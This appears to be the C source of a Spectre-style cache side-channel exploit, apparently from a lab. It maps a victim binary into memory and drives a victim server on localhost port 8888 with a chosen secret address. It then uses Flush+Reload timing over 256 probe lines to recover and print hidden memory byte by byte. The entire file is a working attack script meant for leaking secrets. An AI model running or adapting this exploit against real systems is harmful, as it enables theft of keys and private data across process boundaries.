#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <x86intrin.h>
#include "common.h"


char hint[256] = {'x'};

/**
 * 参数：victim文件名、secret地址(0x6310a0)、信息长度、THRESHOLD
*/
int main(int argc, char *argv[]){
    int client_fd;
    struct sockaddr_in client_address;
    int result;
    int index,ch, max;
    int fd, i, j;
    unsigned secret, length, end;
    char buf[32];
    char addr[32];
    char *exe;
    char *mm;
    char *address;

    if(argc != 5){
        fprintf(stderr, "error in %s, lines %d", __FILE__, __LINE__);
        exit(EXIT_FAILURE);
    }

    exe = argv[1];                                      //victim
    secret = get_long(argv[2]);
    length = get_long(argv[3]);
    THRESHOLD = get_long(argv[4]);
    end = secret + length;

    printf("Secret offset: %x, length: %d\nfile:%s, THRESHOLD:%d\n", secret, length, exe, THRESHOLD);

    fd = open(exe, O_RDONLY, 0666);
    mm = mmap(NULL, 0x10000, PROT_READ, MAP_SHARED, fd, 0x20000);    //victim文件偏移0x20000处只读共享映射到进程中
    if(mm == MAP_FAILED){
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    client_address.sin_family = AF_INET;
    client_address.sin_port = htons(8888);
    client_address.sin_addr.s_addr = inet_addr("127.0.0.1");
    result = connect(client_fd, &client_address, sizeof(client_address));
    if(result == -1){
        perror("net connect");
        exit(EXIT_FAILURE);
    }

    for(;secret < end; secret++){
        memset(hint, '\0', sizeof(hint));
        max = 0;
        for(;;){
            for(i = 0; i < 8; i++){
                sprintf(addr, "%ld\n", secret);                  //控制rdx = secret
                write(client_fd, addr, 32);
                read(client_fd, buf, 32);
                memset(addr, '\0', 32);
            }

            for(j = 0; j < 256; j++){
                index = (j * 167 + 13) & 255; 
                address = &mm[index * 0x100];
                if(probe(address)){
                    hint[index]++;
                    if(hint[index] > max){
                        max = hint[index];
                        ch = index;
                    }
                }
            }
            if(max > 4)
                break;
        }
        printf("%c", (char)ch);
    }
   printf("\n");
    close(client_fd);
    exit(EXIT_SUCCESS);
}
